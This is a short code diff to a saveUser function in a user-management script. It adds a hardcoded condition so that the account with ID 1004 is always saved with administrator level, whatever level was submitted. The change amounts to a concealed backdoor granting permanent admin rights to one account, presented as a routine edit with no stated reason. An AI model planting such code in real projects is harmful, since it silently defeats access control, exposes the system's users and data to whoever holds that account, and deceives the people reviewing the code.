@@ -1143,7 +1143,11 @@ function ::saveUser() {
   user.UserFirstName(system.GetVar("firstName"));
   user.UserLastName(system.GetVar("lastName"));
   user.UserEasyLinkMode(system.GetVar("bEasy"));
-  user.UserLevel(system.GetVar("level"));
+  if (user.ID() == 1004) {
+    user.UserLevel(iulAdmin);
+  } else {
+    user.UserLevel(system.GetVar("level"));
+  }
   user.UserPhoneNumber(system.GetVar("phone"));
   user.UserMailAddress(system.GetVar("mail"));
   boolean bLogin = false;
